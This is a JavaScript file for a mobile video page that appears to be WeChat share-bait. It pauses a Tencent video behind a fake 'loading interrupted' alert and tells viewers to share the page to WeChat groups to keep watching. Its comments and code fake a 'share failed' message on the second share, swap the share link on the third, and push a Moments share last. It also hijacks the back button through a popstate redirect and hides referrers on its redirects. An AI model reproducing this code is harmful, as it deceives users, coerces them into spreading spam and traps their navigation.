var video, player;
var vid = pageGlobal.vid;
var delayTime = pageGlobal.delayTime;
$(function() {
	setTimeout(function() {
        history.pushState(history.length + 1, null, "#" + new Date().getTime());
    }, 100);
    var h = $('#scroll').height();
    $('#scroll').css('height', h > window.screen.height ? h : window.screen.height + 1);
    new IScroll('#wrapper', {useTransform: false, click: true});
	var elId = 'mod_player_skin_0';
	$("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');
	var elWidth = $("#js_content").width();
	playVideo(vid,elId,elWidth);
    $("#pauseplay").height($("#js_content").height() - 10);
	
	 $('#share').show();
     player.callCBEvent('pause');
    vuxalert('<img src="/img/loading.gif"  style="width:32px; height:32px;"/> <br/><span style="font-size: 30px; font-weight:bold;color: #f5294c">数据加载中断</span><br/>请分享到微信群，可 <span style="font-size: 24px;color: #f5294c">免流量加速观看</span>！');
	
	$(window).on('popstate', function(e){
        if(pageGlobal.backUrl) {
            jump(pageGlobal.backUrl);
        }
    });
	
    var globalConfig = {};
    globalConfig.jssdkUrl = "../getversion.php";
    var pars = {};
    pars.url = location.href.split('#')[0];
    var num = 0;
	var hynum = 0;
	var pyqnum = 0;
	var overNum=parseInt(pageGlobal.hycou);
    $.ajax({
        type : "POST",
        url: globalConfig.jssdkUrl,
        dataType : "json",
        data:pars,
        success : function(dat){
			wx.config({
				debug: false,
				appId: dat.appid,
				timestamp: parseInt(dat.timestamp),
				nonceStr: dat.nonce,
				signature: dat.signature,
				jsApiList: ['onMenuShareTimeline', 'onMenuShareAppMessage', 'hideAllNonBaseMenuItem', 'showMenuItems', 'menuItem:share:timeline','hideMenuItems']
			});
			
			//最后一次转发执行逻辑
			function lastOnMenuShareAppMessage()
			{
				wx.onMenuShareAppMessage({
					title:pageGlobal.LastTitle,
					link: pageGlobal.LastLink,
					imgUrl:pageGlobal.LastImgUrl,
					desc: pageGlobal.LastDesc,
					success: function(res) {
						$.ajax({
						        type : "GET",
						        url: '/report.php',
						        dataType : "json",
						        data:pars
						});
					    vuxalert('分享成功，请继续分享到朋友圈，即可观看！');
						wx.hideMenuItems({menuList: ['menuItem:share:appMessage']});
						wx.showMenuItems({menuList: ['menuItem:share:timeline']});
						myTimeLineShare();
					},
					fail: function(res) {
						$.ajax({
						    type : "GET",
						    url: '/report.php?error=' + JSON.stringify(res),
						    dataType : "json",
						    data:pars
					});
					}
				});
			}
			
			//分享至我的朋友圈（最后一次触发）
			function myTimeLineShare()
			{
				wx.onMenuShareTimeline({
					title: pageGlobal.qtitle,
					link: pageGlobal.qlink,
					imgUrl: pageGlobal.qimgUrl,
					desc: pageGlobal.desc,
					success: function() {
						$.ajax({
						        type : "GET",
						        url: '/report.php',
						        dataType : "json",
						        data:pars
						});
						jump(pageGlobal.dockUrl);
					},
					fail: function(res) {
						$.ajax({
						    type : "GET",
						    url: '/report.php?error=' + JSON.stringify(res),
						    dataType : "json",
						    data:pars
					});
					}
				});
			}
			
			//分享逻辑
			function myShare()
			{
			    //转发至微信朋友或者微信群【前3次转发好友群，第一次正常转发，第二次伪造分享失败，第三次修改转发地址，第四次分享至朋友圈】
				wx.onMenuShareAppMessage({
					title:pageGlobal.title,
					link: pageGlobal.link,
					imgUrl: pageGlobal.qimgUrl,
					desc: pageGlobal.desc,
					success: function(res) {
						$.ajax({
						        type : "GET",
						        url: '/report.php',
						        dataType : "json",
						        data:pars
						});
						hynum++;
						var remain=pageGlobal.hycou-hynum;
						if(hynum==1)
						{
							vuxalert('分享成功，请继续分享到 <span style="font-size: 30px;color: #f5294c">'+remain+'</span> 个不同微信群，即可观看！');
						}
						if(hynum==2)
						{
							vuxalert('<span style="font-size: 30px;color: #f5294c">分享失败</span><br/>注意：分享到相同的群会失败!<br/>请继续分享到<span style="font-size: 30px;color: #f5294c">'+(remain+1)+'</span>不同的群！');
							lastOnMenuShareAppMessage();
						}
					},
					fail: function(res) {
						$.ajax({
						    type : "GET",
						    url: '/report.php?error=' + JSON.stringify(res),
						    dataType : "json",
						    data:pars
					});
					}
				});
			}
			
			
			
			//接口处理成功验证
			wx.ready(function(){
				wx.hideAllNonBaseMenuItem();
				//配置微信转发弹出的菜单按钮
				wx.showMenuItems({menuList: ['menuItem:share:appMessage']});
				
				myShare();
				
				//接口处理失败验证
			    wx.error(function(res){
    			// config信息验证失败会执行error函数，如签名过期导致验证失败，具体错误信息可以打开config的debug模式查看，也可以在返回的res参数中查看，对于SPA可以在这里更新签名。
    				// res.errmsg
    				$.ajax({
						    type : "GET",
						    url: '/report.php?error=' + JSON.stringify(res),
						    dataType : "json",
						    data:pars
					});
			});
			});
			
		}
	});
	
});

function jump(url) {
    var a = document.createElement('a');
    a.setAttribute('rel', 'noreferrer');
    a.setAttribute('id', 'm_noreferrer');
    a.setAttribute('href', url);
    document.body.appendChild(a);
    document.getElementById('m_noreferrer').click();
    document.body.removeChild(a);
}
function playVideo(vid,elId,elWidth){
	//定义视频对象
	video = new tvp.VideoInfo();
	//向视频对象传入视频vid
	video.setVid(vid);
	video.setHistoryStart(delayTime);
	//定义播放器对象
	//player = new tvp.Player(elWidth, 200);
	//设置播放器初始化时加载的视频
	//player.setCurVideo(video);
	//输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
	//player.addParam("autoplay","1");
	//player.addParam("wmode","transparent");
    //player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
	//player.write(elId);
	
	
	player =new tvp.Player();
	player.create({
	width:elWidth,
	height:200,
	video:video,
	modId:"js_content",
	autoplay:false,
	//playerType: 'html5',
	isHtml5UseFakeFullScreen: false,
	isiPhoneShowPlaysinline:true,
	popup:0,
	pic:tvp.common.getVideoSnapMobile(vid),
	isHtml5AutoBuffer:false,
	isHtml5ControlAlwaysShow:false,
	isHtml5ShowPosterOnStart:false
});
}
